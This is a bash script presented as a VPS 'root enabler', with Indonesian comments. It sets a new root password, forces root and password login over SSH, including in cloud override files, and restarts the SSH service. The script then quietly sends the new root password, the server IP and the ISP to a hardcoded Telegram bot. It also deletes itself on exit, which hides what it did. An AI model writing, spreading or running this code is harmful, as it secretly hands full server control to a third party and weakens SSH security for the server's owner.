#!/bin/bash
# Script Root Enabler by @Deki_niswara

# Fungsi hapus diri saat keluar
junc0() {
    rm -rf "$0"
    exit 0
}
trap junc0 SIGINT SIGTERM EXIT

# Bersihkan layar
clear

# Warna
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

# Fungsi cetak hijau
hijau() { echo -e "$G$*$N"; }

# === DETEKSI IP & ISP ===
echo -e "${C}Mendeteksi IP dan ISP...${N}"
IP=$(wget -qO- ipv4.icanhazip.com)
ISP=$(wget -qO- http://ip-api.com/line?fields=isp)

# Cek apakah user root
if [[ "$EUID" -ne 0 ]]; then
    echo -e "${R}Bukan user root${N}"
    echo -e "${G}Masuk ke mode root dengan perintah: sudo su${N}"
    exit 1
else
    echo -e "${G}Anda sudah dalam mode root${N}"
    sleep 1
fi

# Input password baru
echo ""
read -rp "$(echo -e "Masukkan ${G}password${N} root baru: ")" -e pass

# Validasi password tidak kosong
if [[ -z "$pass" ]]; then
    echo -e "${R}Password tidak boleh kosong!${N}"
    exit 1
fi

# Set password root
echo "root:$pass" | chpasswd

# === BAGIAN POWERFULL (MEMAKSA SETTING SSH AWS/GCP) ===
# 1. Edit file utama sshd_config dengan Regex
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i 's/^#\?ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/g' /etc/ssh/sshd_config

# 2. HANCURKAN settingan tersembunyi (AWS/GCP/Azure)
if [ -d /etc/ssh/sshd_config.d ]; then
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
fi

# 3. Restart SSH (Dual Support: ssh & sshd)
systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null

# === KONFIGURASI TELEGRAM (FORMAT BARU) ===
TIMES="10"
CHATID="7673056681"          
KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8"  
URL="https://api.telegram.org/bot${KEY}/sendMessage"

# Format Pesan Sesuai Permintaan
TEXT="
────────────────────
<b>     ☘ NEW ROOT DETAIL ☘</b>
────────────────────
<code>User      :</code> <code>root</code>
<code>Password  :</code> <code>${pass}</code>
<code>IP VPS    :</code> <code>${IP}</code>
<code>ISP       :</code> <code>${ISP}</code>
<code>Author    :</code> <code>@Deki_niswara</code>
────────────────────
<i>Note: Auto notif from your script...</i>
"

# Kirim pesan (diam)
curl -s --max-time "${TIMES}" -d "chat_id=${CHATID}&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" "${URL}" >/dev/null

# === TAMPILAN AKHIR DI TERMINAL ===
clear
echo
hijau "╭══════════════════════════════════════╮"
hijau "│         ${W}INFO YOUR ROOT USER${G}          │"
hijau "╰══════════════════════════════════════╯"
hijau "╭══════════════════════════════════════╮"
hijau "│ ${W}User      : ${G}root${N}"
hijau "│ ${W}Password  : ${G}${pass}${N}"
hijau "│ ${W}IP VPS    : ${G}${IP}${N}"
hijau "│ ${W}ISP       : ${G}${ISP}${N}"
hijau "│ ${W}Author    : ${G}@Deki_niswara${N}"
hijau "╰══════════════════════════════════════╯"
echo ""
